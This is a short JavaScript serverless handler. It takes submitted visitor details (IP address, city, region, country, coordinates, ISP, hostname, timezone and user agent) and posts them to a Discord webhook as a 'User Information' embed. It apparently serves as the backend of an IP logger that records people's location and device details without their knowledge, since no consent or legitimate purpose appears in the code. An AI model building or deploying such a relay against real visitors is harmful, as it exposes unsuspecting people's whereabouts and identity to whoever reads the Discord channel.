export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body;

  const webhookURL = process.env.WEBHOOK_URL;

  const message = {
    embeds: [
      {
        title: "User Information",
        color: 16711680,
        fields: [
          { name: "IP Address", value: data.ip || "N/A", inline: true },
          { name: "City", value: data.city || "N/A", inline: true },
          { name: "Region", value: data.region || "N/A", inline: true },
          { name: "Country", value: data.country || "N/A", inline: true },
          { name: "Location", value: data.loc || "N/A", inline: true },
          { name: "Organisation", value: data.org || "N/A", inline: true },
          { name: "Hostname", value: data.hostname || "N/A", inline: true },
          { name: "Timezone", value: data.timezone || "N/A", inline: true },
          { name: "UserAgent", value: data.useragent || "N/A", inline: false }
        ],
        footer: {
          text: "User Info"
        }
      }
    ]
  };

  try {
    const response = await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message)
    });

    if (!response.ok) {
      throw new Error(`Discord HTTP error! status: ${response.status}`);
    }

    res.json({ success: true });
  } catch (error) {
    console.error("Error sending to webhook:", error);
    res.status(500).json({ error: error.message });
  }
}
